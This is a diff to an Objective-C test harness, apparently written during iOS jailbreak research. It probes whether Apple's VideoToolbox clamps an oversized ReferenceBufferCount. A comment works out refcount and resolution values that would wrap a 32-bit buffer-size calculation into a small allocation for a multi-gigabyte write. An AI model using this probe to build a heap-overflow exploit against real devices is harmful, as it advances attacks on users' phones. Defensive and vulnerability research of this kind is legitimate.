@@ -75,18 +75,28 @@ static void report_line(const char *s)
 	fflush(g_report);
 }
 
-static void logline(const char *fmt, ...)
+/*
+ * O-C (session "jailbreak 3") BUGFIX: logline() took `const char *fmt`, but every
+ * call site passes an Objective-C @"..." literal, i.e. an NSString OBJECT, not a C
+ * string. vsnprintf() then treated the object's pointer bytes as the format string,
+ * so every line came out as garbage (we pulled Documents/vt4_report.txt and it was
+ * 696 bytes of "A"). That is why the read-back line was never visible anywhere -
+ * stdout, syslog and file were all garbage. The format string is an NSString, so
+ * format it as one.
+ */
+static void logline(NSString *fmt, ...)
 {
 	va_list ap;
-	char buf[1024];
 	va_start(ap, fmt);
-	vsnprintf(buf, sizeof(buf), fmt, ap);
+	NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
 	va_end(ap);
-	fputs(buf, stdout);
+	const char *c = [s UTF8String];
+	if (!c) return;
+	fputs(c, stdout);
 	fputc('\n', stdout);
 	fflush(stdout);
-	report_line(buf);
-	NSLog(@"[vt] %{public}s", buf);
+	report_line(c);
+	NSLog(@"[vt] %{public}s", s);
 }
 
 static void enc_cb(void *refcon, void *src, OSStatus status, VTEncodeInfoFlags flags, CMSampleBufferRef sbuf)
@@ -139,11 +149,67 @@ int main(void)
 				CFTypeRef got = NULL;
 				OSStatus gs = VTSessionCopyProperty(probe, kVTCompressionPropertyKey_ReferenceBufferCount,
 					NULL, &got);
-				logline(@"read-back ReferenceBufferCount: st=%d value=%s", (int)gs,
-					(gs == noErr && got) ? [[(NSNumber *)got description] UTF8String] : "(n/a)");
+				logline(@"read-back ReferenceBufferCount: st=%d value=%s CLAMPED=%d", (int)gs,
+					(gs == noErr && got) ? [[(NSNumber *)got description] UTF8String] : "(n/a)",
+					(gs == noErr && got && [(NSNumber *)got intValue] != refs));
 				if (got) CFRelease(got);
 				VTCompressionSessionInvalidate(probe);
 				CFRelease(probe);
+			}
+		}
+
+		/*
+		 * O-C: second clamp probe. One launch can now test TWO refcounts, so a sweep
+		 * does not need a rebuild per value. VT_REFS2 (and optional VT_W2/VT_H2) probe
+		 * the overflow candidate - e.g. refs=324 at 4096x2160 10-bit 420 is
+		 * 324 * 13,271,040 = 4,299,816,960 -> wraps to 4,849,664 (a 4.8 MB buffer for a
+		 * 4.3 GB write) IF VideoToolbox passes the count through unclamped.
+		 */
+		{
+			int refs2 = envi("VT_REFS2", 0);
+			int w2 = envi("VT_W2", 0);
+			int h2 = envi("VT_H2", 0);
+			if (refs2 > 0) {
+				int pw = w2 > 0 ? w2 : w;
+				int ph = h2 > 0 ? h2 : h;
+				long long frame_bytes = (long long)pw * ph * 3 / 2;  /* 420 10-bit approx */
+				long long product = (long long)refs2 * frame_bytes;
+				logline(@"probe2 refs=%d w=%d h=%d product=%lld (0x%llx) wrapped32=%lld",
+				        refs2, pw, ph, product,
+				        (unsigned long long)product, (long long)(product & 0xFFFFFFFFull));
+				VTCompressionSessionRef probe2 = NULL;
+				NSMutableDictionary *spec2 = [NSMutableDictionary dictionary];
+				spec2[(__bridge id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder] = @YES;
+				spec2[(__bridge id)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder] = @NO;
+				NSMutableDictionary *props2 = [NSMutableDictionary dictionary];
+				props2[(__bridge id)kVTCompressionPropertyKey_ProfileLevel] =
+					hevc ? (__bridge id)kVTProfileLevel_HEVC_Main10_AutoLevel
+					      : (__bridge id)kVTProfileLevel_H264_High_AutoLevel;
+				props2[(__bridge id)kVTCompressionPropertyKey_AverageBitRate] = @(2000000);
+				props2[(__bridge id)kVTCompressionPropertyKey_AllowFrameReordering] = @YES;
+				props2[(__bridge id)kVTCompressionPropertyKey_RealTime] = @YES;
+				props2[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameInterval] = @(1);
+				props2[(__bridge id)kVTCompressionPropertyKey_ReferenceBufferCount] = @(refs2);
+				if (depth == 10) {
+					props2[(__bridge id)kVTCompressionPropertyKey_OutputBitDepth] = @10;
+				}
+				OSStatus st2 = VTCompressionSessionCreate(NULL, pw, ph,
+					hevc ? kCMVideoCodecType_HEVC : kCMVideoCodecType_H264,
+					(__bridge CFDictionaryRef)spec2, (__bridge CFDictionaryRef)props2,
+					NULL, enc_cb, NULL, &probe2);
+				logline(@"probe2 session create st=%d", (int)st2);
+				if (st2 == noErr && probe2) {
+					CFTypeRef got2 = NULL;
+					OSStatus gs2 = VTSessionCopyProperty(probe2,
+						kVTCompressionPropertyKey_ReferenceBufferCount, NULL, &got2);
+					logline(@"probe2 read-back ReferenceBufferCount: st=%d value=%s CLAMPED=%d",
+					        (int)gs2,
+					        (gs2 == noErr && got2) ? [[(NSNumber *)got2 description] UTF8String] : "(n/a)",
+					        (gs2 == noErr && got2 && [(NSNumber *)got2 intValue] != refs2));
+					if (got2) CFRelease(got2);
+					VTCompressionSessionInvalidate(probe2);
+					CFRelease(probe2);
+				}
 			}
 		}
 
